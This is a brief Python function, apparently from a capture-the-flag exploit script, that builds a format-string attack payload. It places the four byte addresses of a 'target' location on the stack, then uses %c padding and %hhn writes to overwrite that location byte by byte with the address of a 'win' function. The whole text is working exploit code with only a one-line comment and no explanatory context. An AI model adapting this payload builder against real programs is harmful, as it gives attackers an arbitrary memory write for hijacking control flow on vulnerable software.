# overwrites 'target', with 'win'.
# 
def build_payload(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += f"%{240 - padding}c".encode()

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += f"%{offset + i}$hhn".encode()
        else:
            payload += f"%{byte}c%{offset + i}$hhn%{256 - byte}c".encode()

    return payload
